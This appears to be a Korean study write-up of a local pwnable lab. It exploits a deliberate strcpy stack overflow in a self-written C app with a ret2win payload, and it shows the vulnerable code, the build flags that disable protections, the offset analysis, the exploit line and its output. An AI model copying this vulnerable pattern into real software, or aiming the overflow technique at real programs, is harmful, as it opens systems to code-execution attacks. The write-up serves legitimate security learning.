# 03 · PhotoDot (포너블 / 시스템 해킹)

C로 만든 이미지 필터 앱 `photoDot`의 **스택 버퍼 오버플로우**를 익스플로잇해,
리턴 주소를 숨은 함수 `hidden()`으로 덮어 임의 코드 실행(ret2win)한다.

## 앱 개요

`photoDot`은 `image` 파일을 읽어 점(`.`)으로 된 도트 이미지로 바꾼다.

```c
int main(){
    char img_content[200];
    fread(img_content, 1, 200, file);   // image 파일 200바이트 read
    dotty(img_content);
}
void dotty(char* mem){
    char filter[100];
    strcpy(filter, mem);                // ❌ 100바이트 버퍼에 최대 200바이트 복사
    ...
}
void hidden(){ /* id/pw 출력 - 평소엔 호출 안 됨 */ }
```

## 컴파일 (보호기능 OFF — 입문용)

```bash
gcc -o photoDot photoDot.c -fno-stack-protector -no-pie -zexecstack
```

- `-fno-stack-protector` : 스택 카나리 해제
- `-no-pie` : 주소 고정(ASLR/PIE 해제) → `hidden` 주소가 항상 같음
- `-zexecstack` : 실행 가능 스택 (쉘코드용)

> 바이너리는 빌드 산출물이라 커밋하지 않는다(`.gitignore`).

## 분석

```
objdump / nm:
  hidden  = 0x40122a        # no-pie 라 고정 주소
  dotty 에서 filter = [rbp-0x70]   (strcpy 목적지)
  저장된 반환주소 = [rbp+0x08]
  => filter 에서 반환주소까지 오프셋 = 0x70 + 8 = 120 바이트
```

## 익스플로잇 (ret2win) — [exploit.py](exploits/exploit.py)

```
payload = b'A'*120 + p64(0x40122a)      # 반환주소를 hidden 으로 덮음
```

이 payload를 `image` 파일로 저장한 뒤 실행:

```bash
python exploits/exploit.py image         # image 파일 생성
printf '\n' | ./photoDot
```

결과 — 호출된 적 없는 `hidden()`이 실행되어 숨은 값이 출력된다:

```
############# id : Jaeho Jeon #############
############# pw : qwer1234 ###############
```

### strcpy의 null 제약을 이용한 포인트

`strcpy`는 null(`\x00`)에서 멈춘다. 반환주소 `0x000000000040122a`는 하위 3바이트
(`2a 12 40`)만 쓰고 그 뒤 null로 끝내면 된다. 원래 그 자리에 있던 반환주소의
상위 4바이트가 이미 `0x00`이라, 최종적으로 정확히 `0x40122a`가 된다.

## 배운 것

- 길이 검사 없는 `strcpy`/`gets`/`scanf("%s")`는 스택 오버플로우의 전형.
- 반환주소를 덮으면 **프로그램의 실행 흐름을 탈취**(임의 코드 실행)할 수 있다.
- 방어(끄고 시작한 것들): 스택 카나리, ASLR/PIE, NX(실행 불가 스택),
  그리고 애초에 경계 검사(`strncpy`, `fgets` + 길이 제한).

## 진행 현황

- [x] photoDot.c 작성·컴파일 (보호기능 off)
- [x] 오버플로우 오프셋(120) 분석
- [x] ret2win 익스플로잇으로 hidden() 실행 성공

> ⚠️ 내가 작성·컴파일한 바이너리를 로컬 Docker 컨테이너에서 공격한 교육용 실습.
> 쉘코드/Stack Guard 우회 등 심화는 과정 원문의 후속 섹션 참고.
